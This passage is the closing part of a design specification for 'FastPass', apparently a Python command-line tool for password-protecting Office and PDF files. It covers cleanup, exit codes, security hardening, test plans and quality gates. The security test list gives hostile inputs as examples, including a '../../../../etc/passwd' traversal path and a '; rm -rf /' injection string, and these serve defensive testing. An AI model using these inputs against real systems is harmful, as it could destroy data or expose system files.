    ```
  - **Failed files list**: 
    ```
    ✗ Failed files:
      • protected.pdf: Wrong password
      • corrupt.docx: File format error
      • readonly.xlsx: Permission denied
    ```
  - **Troubleshooting section**: If failures occurred, provide specific guidance based on failure types

- **E3: Sensitive Data Memory Cleanup**
  - **Password variables**: Explicitly delete all password variables from memory
  - **Command line args**: Clear args.passwords, args.password_list contents  
  - **Processing state**: Clear password_manager internal state
  - **Garbage collection**: Force `gc.collect()` to ensure memory cleanup
  - **Note**: Python doesn't guarantee memory overwriting, but this is best effort cleanup

- **E4: Temporary File & Directory Cleanup**
  - **Temp directory removal**: `shutil.rmtree(temp_dir)` for each temp directory created
  - **Intermediate files**: Clean up any partial processing files left behind
  - **Lock files**: Remove any file locks or temp markers created during processing
  - **Error handling**: Log warnings for cleanup failures but don't fail the operation

- **E5: Final Exit Code Determination**
  - **Exit Code 0**: All files processed successfully, no errors
  - **Exit Code 1**: Some files failed, some succeeded (partial success)
  - **Exit Code 2**: All files failed to process, or no files processed
  - **Exit Code 3**: Security violation detected, operation aborted
  - **Exit Code 4**: Authentication failure (wrong passwords for all files)

- **E6: Operation State Reset**
  - Clear processing queues: `self.processing_queue = []`
  - Reset file manifests: `self.file_manifest = []`
  - Clear handler references: `self.crypto_handlers = {}`
  - Reset application state: `self.ready_for_processing = False`
  - Final log entry: `logger.info(f"FastPass operation completed in {total_time} with {successful_count}/{total_files} files successful")`

---

## Security Implementation Summary

### **Comprehensive Security Hardening Implemented**

FastPass includes enterprise-grade security hardening based on comprehensive threat analysis and attack vector identification. All security measures are mandatory and must be implemented exactly as specified.

#### **Security Mitigations by Attack Vector**

| **Attack Vector** | **Mitigation Implemented** | **Security Function** |
|-------------------|---------------------------|----------------------|
| **Path Traversal** | Hardened path validation with symlink detection | `validate_path_security_hardened()` |
| **Command Injection** | Direct library calls + secure subprocess | `encrypt_file_secure()` |
| **Password Exposure** | Memory clearing + secure input handling | `SecurePasswordManager` |
| **Race Conditions** | Atomic operations + secure temp files | `SecureTempFileManager` |
| **XXE Injection** | XML entity detection + content validation | `validate_xml_security()` |
| **ZIP Bombs** | Compression ratio analysis + size limits | `validate_office_document_security()` |
| **Malicious PDFs** | JavaScript detection + content scanning | `validate_pdf_document_security()` |
| **Symlink Attacks** | Symlink detection + strict path resolution | `validate_path_security_hardened()` |
| **DoS Attacks** | Input size limits + resource constraints | Multiple validation functions |
| **File Format Confusion** | Magic number validation + strict matching | `validate_file_format_secure()` |

#### **Security Configuration Options**

```python
# CLI Security Flags
--allowed-dirs        # Specify custom allowed directories (space-separated)

# Environment Variables
FASTPASS_CUSTOM_ALLOWED_DIRS=""       # Custom allowed directories (comma-separated)
FASTPASS_MAX_PASSWORD_LENGTH=1024     # Password length limit
FASTPASS_MAX_JSON_SIZE=1048576        # 1MB JSON input limit
FASTPASS_ENABLE_SECURE_DELETION=true  # Overwrite files before deletion
FASTPASS_SYMLINK_PROTECTION=true      # Block symlink access
FASTPASS_XML_ENTITY_PROTECTION=true   # XXE protection enabled
```

#### **Security-First Design Principles**

1. **Principle of Least Privilege**: By default, allow access to user home directory and current working directory for practical usability
2. **Defense in Depth**: Multiple layers of validation and sanitization
3. **Fail Secure**: Security violations result in immediate termination
4. **Input Validation**: All user inputs validated against strict criteria
5. **Secure by Default**: Most restrictive settings enabled by default
6. **Memory Protection**: Best-effort password clearing and secure handling
7. **Atomic Operations**: Prevent race conditions and partial state corruption
8. **Content Validation**: Deep inspection of file contents for malicious patterns

#### **Critical Security Requirements**

**MANDATORY IMPLEMENTATION**: The following security measures are not optional and must be implemented exactly as specified:

- ✅ **Path Traversal Protection**: `validate_path_security_hardened()` with symlink detection
- ✅ **Command Injection Prevention**: Direct library calls or secure subprocess with argument validation
- ✅ **Password Memory Protection**: `SecurePasswordManager` with memory clearing
- ✅ **Secure Temporary Files**: Cryptographically secure naming and restrictive permissions (0o600)
- ✅ **File Format Validation**: Magic number + extension cross-validation with attack detection
- ✅ **Input Sanitization**: All user inputs validated for length, content, and dangerous patterns
- ✅ **Error Sanitization**: No sensitive information disclosed in error messages
- ✅ **Resource Limits**: File size, path length, and processing time constraints

#### **Security Testing Requirements**

Each security measure must be tested with specific attack scenarios:

```python
# Security Test Cases (Required)
test_path_traversal_attacks()          # ../../../../etc/passwd
test_symlink_attacks()                 # Symlink to sensitive files  
test_command_injection()               # ; rm -rf / in file paths
test_password_exposure()               # Process list monitoring
test_xxe_injection()                   # XML external entity attacks
test_zip_bomb_detection()              # Compression ratio attacks
test_malicious_pdf_content()           # JavaScript/launch actions
test_race_condition_prevention()       # Concurrent file operations
test_dos_via_large_inputs()            # Oversized files and inputs
test_file_format_confusion()           # Polyglot and mismatched formats
```

#### **Security Audit Checklist**

Before deployment, verify each security control:

- [ ] Path validation blocks `../../../etc/passwd` access attempts
- [ ] Symlink access denied with clear error message  
- [ ] Subprocess calls use argument arrays, never shell execution
- [ ] Passwords not visible in `ps aux` output during processing
- [ ] JSON password input validated for size and content
- [ ] Temporary files created with 0o600 permissions
- [ ] File format mismatches rejected (e.g., .pdf with .docx magic number)
- [ ] ZIP bomb detection triggers on high compression ratios
- [ ] PDF JavaScript content blocked
- [ ] XXE entity declarations in Office documents blocked
- [ ] Memory clearing attempted for password variables
- [ ] Error messages sanitized of sensitive information

---

## Implementation Status & Next Steps

### Current Development Phase
- **Phase**: Architecture specification complete
- **Status**: Ready for implementation
- **Next Priority**: Begin implementation of Section A (CLI Parsing & Initialization)

### Implementation Order
1. **Section A**: CLI parsing and basic application structure
2. **Section B**: Security validation and file format detection  
3. **Section C**: Crypto tool integration and handler classes
4. **Section D**: File processing pipeline with error handling
5. **Section E**: Cleanup, reporting, and finalization

### Key Implementation Notes
- Each code section must be labeled with exact IDs from this specification (e.g., `# A1a`, `# B3c`)
- All error handling must follow the patterns defined in the pseudocode
- Security validations are mandatory and cannot be simplified or skipped
- Password handling must implement the complete priority system as specified
- File processing must use the secure temporary directory approach

### Comprehensive Testing Strategy

#### Unit Testing Framework
- **Framework**: pytest with coverage reporting (pytest-cov)
- **Test Structure**: Mirror source code structure in tests/ directory
- **Coverage Target**: Minimum 85% code coverage for all modules
- **Mocking**: Use unittest.mock for external dependencies and file system operations

#### Test Categories

**1. Security Testing (Critical Priority)**
```python
# tests/test_security.py
class TestPathTraversalSecurity:
    def test_reject_parent_directory_traversal(self):
        """Test rejection of '../' path traversal attempts"""
    
    def test_reject_absolute_paths_outside_allowed(self):
        """Test rejection of paths outside configured allowed directories"""
    
    def test_symlink_resolution_security(self):
        """Test proper handling of symbolic links"""
    
    def test_windows_path_traversal_patterns(self):
        """Test Windows-specific path traversal patterns"""
    
    def test_url_encoded_path_injection(self):
        """Test rejection of URL-encoded traversal attempts"""

class TestPasswordSecurity:
    def test_password_memory_clearing(self):
        """Test password variables are cleared from memory"""
    
    def test_password_not_logged(self):
        """Test passwords never appear in log outputs"""
    
    def test_error_message_sanitization(self):
        """Test sensitive data removed from error messages"""

class TestFileFormatSecurity:
    def test_magic_number_validation(self):
        """Test file format detection via magic numbers"""
    
    def test_malicious_file_rejection(self):
        """Test rejection of files with mismatched extensions"""
    
    def test_large_file_rejection(self):
        """Test rejection of files exceeding size limits"""
```

**2. Crypto Handler Testing**
```python
# tests/test_crypto_handlers.py
class TestOfficeDocumentHandler:
    def test_encrypt_docx_file(self):
        """Test DOCX encryption with valid password"""
    
    def test_decrypt_protected_xlsx(self):
        """Test XLSX decryption with correct password"""
    
    def test_wrong_password_handling(self):
        """Test graceful handling of incorrect passwords"""
    
    def test_corrupted_file_detection(self):
        """Test detection and handling of corrupted Office files"""

class TestPDFHandler:
    def test_pdf_encryption_standard(self):
        """Test PDF encryption with standard security"""
    
    def test_pdf_decryption_validation(self):
        """Test PDF decryption and integrity validation"""
    
    def test_pdf_permission_handling(self):
        """Test handling of PDF permission restrictions"""
```

**3. Integration Testing**
```python
# tests/test_integration.py
class TestEndToEndWorkflows:
    def test_full_encryption_workflow(self):
        """Test complete file encryption from CLI to output"""
    
    def test_batch_processing_mixed_formats(self):
        """Test processing multiple file types in single operation"""
    
    def test_recursive_directory_processing(self):
        """Test recursive directory processing with filters"""
    
    def test_error_recovery_and_cleanup(self):
        """Test system recovery from processing errors"""

class TestPasswordManagement:
    def test_password_priority_system(self):
        """Test CLI > list file priority order"""
    
    
    def test_stdin_json_password_input(self):
        """Test JSON password input via stdin"""
```

**4. Error Handling Testing**
```python
# tests/test_error_handling.py
class TestErrorScenarios:
    def test_missing_file_handling(self):
        """Test graceful handling of missing input files"""
    
    def test_permission_denied_scenarios(self):
        """Test handling of read/write permission failures"""
    
    def test_disk_space_exhaustion(self):
        """Test behavior when disk space runs out during processing"""
    
    def test_crypto_tool_unavailable(self):
        """Test fallback when required crypto tools missing"""
    
    def test_partial_processing_cleanup(self):
        """Test cleanup of partially processed files on failure"""
```

**5. Performance Testing**
```python
# tests/test_performance.py
class TestPerformanceBenchmarks:
    def test_large_file_processing_time(self):
        """Test processing time for files up to size limit"""
    
    def test_batch_processing_scalability(self):
        """Test performance with increasing number of files"""
    
    def test_memory_usage_monitoring(self):
        """Test memory usage stays within reasonable bounds"""
```

#### Test Data Management
- **Test Fixtures**: Create representative Office/PDF files for testing
- **Encrypted Samples**: Pre-encrypted files with known passwords
- **Malicious Samples**: Files designed to test security vulnerabilities
- **Large Files**: Test files of various sizes up to the limit
- **Corrupted Files**: Intentionally corrupted files for error testing

#### Continuous Integration
- **GitHub Actions**: Run tests on multiple Python versions (3.8+)
- **Platform Testing**: Test on Windows, macOS, and Linux
- **Security Scanning**: Integrate SAST tools (bandit, safety)
- **Coverage Reporting**: Automated coverage reports and enforcement

#### Manual Testing Checklist
- **User Acceptance Testing**: Manual testing of CLI workflows
- **Cross-Platform Testing**: Verify behavior across operating systems
- **Edge Cases**: Manual testing of unusual file combinations
- **Documentation Validation**: Ensure examples in docs actually work

#### Test Execution Commands
```bash
# Run all tests with coverage
pytest tests/ --cov=src --cov-report=html --cov-report=term

# Run only security tests
pytest tests/test_security.py -v

# Run performance benchmarks
pytest tests/test_performance.py --benchmark-only

# Run integration tests
pytest tests/test_integration.py -v
```

### Implementation Quality Gates

**Phase 1 - Security Foundation (Must Pass)**
- All security tests pass (path traversal, file validation, password handling)
- Error message sanitization verified
- Temporary file cleanup confirmed

**Phase 2 - Core Functionality (Must Pass)**  
- All crypto handler tests pass
- File processing pipeline tests pass
- Configuration management tests pass

**Phase 3 - Integration & Performance (Must Pass)**
- End-to-end workflow tests pass
- Performance benchmarks meet targets
- Error recovery tests pass

**Phase 4 - Production Readiness (Must Pass)**
- 85%+ code coverage achieved
- All manual test scenarios pass
- Documentation examples verified

---

This specification serves as the complete blueprint for FastPass implementation. All code must conform to this architecture, implement the exact pseudocode patterns shown above, and pass the comprehensive testing strategy before deployment.
</file>

</files>
